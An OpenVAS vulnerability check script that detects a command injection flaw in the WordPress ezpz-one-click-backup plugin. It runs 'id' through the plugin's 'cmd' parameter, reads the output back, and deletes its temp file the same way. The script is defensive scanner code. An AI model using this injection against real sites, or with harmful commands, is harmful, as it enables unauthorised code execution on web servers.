###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_ezpz_one_click_backup_cmd_exec.nasl 6756 2017-07-18 13:31:14Z cfischer $
#
# WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

tag_insight = "Input passed via the 'cmd' parameter in ezpz-archive-cmd.php
is not properly sanitized.";

tag_impact = "An attacker can exploit this issue to execute arbitrary code
within the context of the web server.";

tag_affected = "12.03.10 and some earlier versions";

tag_summary = "The ezpz-one-click-backup plugin for WordPress is prone to remote code
execution vulnerability because it fails to properly validate user supplied input.";

tag_solution = "Remove this plugin from your WordPress installation.";
tag_vuldetect = "Send a special crafted HTTP GET request and check the response.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105029");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 6756 $");

 script_name("WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability");


 script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2014/05/01/11");
 
 script_tag(name:"last_modification", value:"$Date: 2017-07-18 15:31:14 +0200 (Tue, 18 Jul 2017) $");
 script_tag(name:"creation_date", value:"2014-05-21 11:38:56 +0200 (Wed, 21 May 2014)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("secpod_wordpress_detect_900182.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("wordpress/installed");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

file = 'openvas_' + rand() + '.txt';
url = dir + '/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=id>../backups/' + file;

req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req );

if( buf !~ "HTTP/1\.. 200" ) exit( 99 );

url = dir + '/wp-content/plugins/ezpz-one-click-backup/backups/' + file;
req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req );

if( buf =~ "uid=[0-9]+.*gid=[0-9]+" )
{
  url = dir + '/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=rm%20../backups/' + file;
  req = http_get( item:url, port:port );
  http_send_recv( port:port, data:req, bodyonly:FALSE );

  security_message( port:port );
  exit( 0 );
}

exit( 99 );

